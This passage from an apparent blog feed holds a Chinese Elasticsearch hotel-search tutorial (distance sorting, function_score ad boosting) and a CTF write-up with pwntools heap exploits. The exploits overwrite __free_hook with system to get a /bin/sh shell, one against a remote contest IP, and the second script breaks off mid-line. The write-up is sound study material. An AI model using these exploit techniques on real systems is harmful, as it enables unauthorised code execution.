/>发现确实可以实现对我附近酒店的排序，不过并没有看到酒店到底距离我多远，这该怎么办？<br />排序完成后，页面还要获取我附近每个酒店的具体<strong>距离</strong>值，这个值在响应结果中是独立的：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218495570-0e2f70eb-d95d-45fb-ab5a-f207c210a6d3.png#crop=0&crop=0&crop=1&crop=1&id=dmuFo&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />因此，我们在结果解析阶段，除了解析source部分以外，还要得到sort部分，也就是排序的距离，然后放到响应结果中。<br />我们要做两件事：</p><ul><li>修改HotelDoc，添加排序距离字段，用于页面显示</li><li>修改HotelService类中的handleResponse方法，添加对sort值的获取</li></ul><p>1）修改HotelDoc类，添加距离字段</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.hotel.pojo;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HotelDoc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line">    <span class="keyword">private</span> Integer price;</span><br><span class="line">    <span class="keyword">private</span> Integer score;</span><br><span class="line">    <span class="keyword">private</span> String brand;</span><br><span class="line">    <span class="keyword">private</span> String city;</span><br><span class="line">    <span class="keyword">private</span> String starName;</span><br><span class="line">    <span class="keyword">private</span> String business;</span><br><span class="line">    <span class="keyword">private</span> String location;</span><br><span class="line">    <span class="keyword">private</span> String pic;</span><br><span class="line">    <span class="comment">// 排序时的 距离值</span></span><br><span class="line">    <span class="keyword">private</span> Object distance;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HotelDoc</span><span class="params">(Hotel hotel)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = hotel.getId();</span><br><span class="line">        <span class="keyword">this</span>.name = hotel.getName();</span><br><span class="line">        <span class="keyword">this</span>.address = hotel.getAddress();</span><br><span class="line">        <span class="keyword">this</span>.price = hotel.getPrice();</span><br><span class="line">        <span class="keyword">this</span>.score = hotel.getScore();</span><br><span class="line">        <span class="keyword">this</span>.brand = hotel.getBrand();</span><br><span class="line">        <span class="keyword">this</span>.city = hotel.getCity();</span><br><span class="line">        <span class="keyword">this</span>.starName = hotel.getStarName();</span><br><span class="line">        <span class="keyword">this</span>.business = hotel.getBusiness();</span><br><span class="line">        <span class="keyword">this</span>.location = hotel.getLatitude() + <span class="string">&quot;, &quot;</span> + hotel.getLongitude();</span><br><span class="line">        <span class="keyword">this</span>.pic = hotel.getPic();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2）修改HotelService中的handleResponse方法<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218495665-339c3bf2-820e-44cc-8429-09576817cc19.png#crop=0&crop=0&crop=1&crop=1&id=wQX6I&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />重启后测试，发现页面能成功显示距离了：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218495771-85b34aa7-a6b1-4e70-965e-baec474275da.png#crop=0&crop=0&crop=1&crop=1&id=F5OtP&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="n9lvz"></a></p><h2 id="4-4-酒店竞价排名"><a href="#4-4-酒店竞价排名" class="headerlink" title="4.4.酒店竞价排名"></a>4.4.酒店竞价排名</h2><p>需求：让指定的酒店在搜索结果中排名置顶<br><a name="aeE3C"></a></p><h3 id="4-4-1-需求分析"><a href="#4-4-1-需求分析" class="headerlink" title="4.4.1.需求分析"></a>4.4.1.需求分析</h3><p>要让指定酒店在搜索结果中排名置顶，效果如图：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218495902-04dd3626-b298-48be-927b-2c17a907b27b.png#crop=0&crop=0&crop=1&crop=1&id=T6MMZ&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />页面会给指定的酒店添加<strong>广告</strong>标记。<br />那怎样才能让指定的酒店排名置顶呢？<br />我们之前学习过的function_score查询可以影响算分，算分高了，自然排名也就高了。而function_score包含3个要素：</p><ul><li>过滤条件：哪些文档要加分</li><li>算分函数：如何计算function score</li><li>加权方式：function score 与 query score如何运算</li></ul><p>这里的需求是：让<strong>指定酒店</strong>排名靠前。因此我们需要给这些酒店添加一个标记，这样在过滤条件中就可以<strong>根据这个标记来判断，是否要提高算分</strong>。<br />比如，我们给酒店添加一个字段：isAD，Boolean类型：</p><ul><li>true：是广告</li><li>false：不是广告</li></ul><p>这样function_score包含3个要素就很好确定了：</p><ul><li>过滤条件：判断isAD 是否为true</li><li>算分函数：我们可以用最简单暴力的weight，固定加权值</li><li>加权方式：可以用默认的相乘，大大提高算分</li></ul><p>因此，业务的实现步骤包括：</p><ol><li>给HotelDoc类添加isAD字段，Boolean类型</li><li>挑选几个你喜欢的酒店，给它的文档数据添加isAD字段，值为true</li><li>修改search方法，添加function score功能，给isAD值为true的酒店增加权重<br><a name="cLG2Z"></a><h3 id="4-4-2-修改HotelDoc实体"><a href="#4-4-2-修改HotelDoc实体" class="headerlink" title="4.4.2.修改HotelDoc实体"></a>4.4.2.修改HotelDoc实体</h3>给<code>cn.itcast.hotel.pojo</code>包下的HotelDoc类添加isAD字段：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218496005-858ef65f-ef79-4c48-a59f-7d418444dd0d.png#crop=0&crop=0&crop=1&crop=1&id=te8i2&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br><a name="PPZPz"></a><h3 id="4-4-3-添加广告标记"><a href="#4-4-3-添加广告标记" class="headerlink" title="4.4.3.添加广告标记"></a>4.4.3.添加广告标记</h3>接下来，我们挑几个酒店，添加isAD字段，设置为true：<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /hotel/_update/<span class="number">1902197537</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;doc&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;isAD&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">POST /hotel/_update/<span class="number">2056126831</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;doc&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;isAD&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">POST /hotel/_update/<span class="number">1989806195</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;doc&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;isAD&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">POST /hotel/_update/<span class="number">2056105938</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;doc&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;isAD&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a name="eLLiF"></a><h3 id="4-4-4-添加算分函数查询"><a href="#4-4-4-添加算分函数查询" class="headerlink" title="4.4.4.添加算分函数查询"></a>4.4.4.添加算分函数查询</h3>接下来我们就要修改查询条件了。之前是用的boolean 查询，现在要改成function_socre查询。<br />function_score查询结构如下：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218492148-edc999a4-3d92-4f9b-a9ff-19da37f00cd0.png#crop=0&crop=0&crop=1&crop=1&id=MsYEG&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />对应的JavaAPI如下：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218496098-9d63e4f3-de19-4ea0-a6be-1d86722dcebd.png#crop=0&crop=0&crop=1&crop=1&id=qeZny&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />我们可以将之前写的boolean查询作为<strong>原始查询</strong>条件放到query中，接下来就是添加<strong>过滤条件</strong>、<strong>算分函数</strong>、<strong>加权模式</strong>了。所以原来的代码依然可以沿用。<br />修改<code>cn.itcast.hotel.service.impl</code>包下的<code>HotelService</code>类中的<code>buildBasicQuery</code>方法，添加算分函数查询：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">buildBasicQuery</span><span class="params">(RequestParams params, SearchRequest request)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 1.构建BooleanQuery</span></span><br><span class="line">    BoolQueryBuilder boolQuery = QueryBuilders.boolQuery();</span><br><span class="line">    <span class="comment">// 关键字搜索</span></span><br><span class="line">    String key = params.getKey();</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="keyword">null</span> || <span class="string">&quot;&quot;</span>.equals(key)) &#123;</span><br><span class="line">        boolQuery.must(QueryBuilders.matchAllQuery());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        boolQuery.must(QueryBuilders.matchQuery(<span class="string">&quot;all&quot;</span>, key));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 城市条件</span></span><br><span class="line">    <span class="keyword">if</span> (params.getCity() != <span class="keyword">null</span> &amp;&amp; !params.getCity().equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        boolQuery.filter(QueryBuilders.termQuery(<span class="string">&quot;city&quot;</span>, params.getCity()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 品牌条件</span></span><br><span class="line">    <span class="keyword">if</span> (params.getBrand() != <span class="keyword">null</span> &amp;&amp; !params.getBrand().equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        boolQuery.filter(QueryBuilders.termQuery(<span class="string">&quot;brand&quot;</span>, params.getBrand()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 星级条件</span></span><br><span class="line">    <span class="keyword">if</span> (params.getStarName() != <span class="keyword">null</span> &amp;&amp; !params.getStarName().equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        boolQuery.filter(QueryBuilders.termQuery(<span class="string">&quot;starName&quot;</span>, params.getStarName()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 价格</span></span><br><span class="line">    <span class="keyword">if</span> (params.getMinPrice() != <span class="keyword">null</span> &amp;&amp; params.getMaxPrice() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        boolQuery.filter(QueryBuilders</span><br><span class="line">                         .rangeQuery(<span class="string">&quot;price&quot;</span>)</span><br><span class="line">                         .gte(params.getMinPrice())</span><br><span class="line">                         .lte(params.getMaxPrice())</span><br><span class="line">                        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2.算分控制</span></span><br><span class="line">    FunctionScoreQueryBuilder functionScoreQuery =</span><br><span class="line">        QueryBuilders.functionScoreQuery(</span><br><span class="line">        <span class="comment">// 原始查询，相关性算分的查询</span></span><br><span class="line">        boolQuery,</span><br><span class="line">        <span class="comment">// function score的数组</span></span><br><span class="line">        <span class="keyword">new</span> FunctionScoreQueryBuilder.FilterFunctionBuilder[]&#123;</span><br><span class="line">            <span class="comment">// 其中的一个function score 元素</span></span><br><span class="line">            <span class="keyword">new</span> FunctionScoreQueryBuilder.FilterFunctionBuilder(</span><br><span class="line">                <span class="comment">// 过滤条件</span></span><br><span class="line">                QueryBuilders.termQuery(<span class="string">&quot;isAD&quot;</span>, <span class="keyword">true</span>),</span><br><span class="line">                <span class="comment">// 算分函数</span></span><br><span class="line">                ScoreFunctionBuilders.weightFactorFunction(<span class="number">10</span>)</span><br><span class="line">            )</span><br><span class="line">        &#125;);</span><br><span class="line">    request.source().query(functionScoreQuery);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;我们已经导入了大量数据到elasticsearch中，实现了elasticsearch的数据存储功能。但elasticsearch最擅长的还是搜索和数据分析。&lt;br /&gt;所以今天，我们研究下elasticsearch的数据搜索功能。我们会分别使用&lt;strong&gt;DSL&lt;/s</summary>
      
    
    
    
    <category term="Java" scheme="http://zephyr-cyber.github.io/categories/Java/"/>
    
    <category term="框架" scheme="http://zephyr-cyber.github.io/categories/Java/%E6%A1%86%E6%9E%B6/"/>
    
    
    <category term="Java框架" scheme="http://zephyr-cyber.github.io/tags/Java%E6%A1%86%E6%9E%B6/"/>
    
    <category term="Elasticsearch高级" scheme="http://zephyr-cyber.github.io/tags/Elasticsearch%E9%AB%98%E7%BA%A7/"/>
    
  </entry>
  
  <entry>
    <title>Pwn2</title>
    <link href="http://zephyr-cyber.github.io/bufferfly/blog/2287909314.html"/>
    <id>http://zephyr-cyber.github.io/bufferfly/blog/2287909314.html</id>
    <published>2021-09-21T09:43:46.000Z</published>
    <updated>2022-12-13T12:39:16.849Z</updated>
    
    <content type="html"><![CDATA[<h1 id="记录两个堆的比赛题"><a href="#记录两个堆的比赛题" class="headerlink" title="记录两个堆的比赛题"></a>记录两个堆的比赛题</h1><p>比较穷网盘没有会员附件私聊我</p><h1 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h1><p><img src="/img/PWN/zhiye2.png" alt="avatar"></p><p><img src="/img/PWN/zhiye.png" alt="avatar"><br>堆溢出<br>感觉比较基础<br>堆溢出改大小制造重叠堆块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;119.61.19.212&#x27;</span>,<span class="number">57511</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=elf.libc</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">context</span>):</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;content: &#x27;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">add(<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x481</span>))</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">malloc_hook=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">16</span></span><br><span class="line">libc_base=malloc_hook-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>)<span class="comment">#10</span></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">91</span>)+p64(free_hook-<span class="number">8</span>))<span class="comment">#1</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(system))<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">io.interactive()</span><br><span class="line">exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h1><p>比赛就两小时<br>想办法绕过这有点麻烦<br><img src="/img/PWN/zhiye3.png" alt="avatar"><br>最后复现出来<br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./pwn2&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn2&#x27;</span>)</span><br><span class="line">libc=elf.libc</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">io.sendafter(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">add(<span class="number">0x1f8</span>)<span class="comment">#0~3</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">add(<span class="number">0xe8</span>)<span class="comment">#4~5</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;ent: &#x27;</span>)</span><br><span class="line">libc_base=u64(io.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">96</span>-<span class="number">16</span></span><br><span class="line">binsh=libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">global_max_fast=libc_base+<span class="number">0x1eeb80</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;ent: &#x27;</span>)</span><br><span class="line">heap_base=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))+<span class="number">0x110</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;heap_base&#x27;</span>,<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#8</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x108</span>+p64(<span class="number">0xf1</span>)+p64(heap_base)+p64(libc_base+<span class="number">0x1eeb80</span>-<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0xe8</span>)<span class="comment">#9</span></span><br><span class="line"><span class="comment">#tcache_stashing_unlink over</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]+<span class="number">0x90</span>-<span class="number">1</span>))</span><br><span class="line">add(<span class="number">0xe8</span>)<span class="comment">#10</span></span><br><span class="line">add(<span class="number">0xe8</span>)<span class="comment">#11</span></span><br><span class="line">edit(<span class="number">11</span>,<span 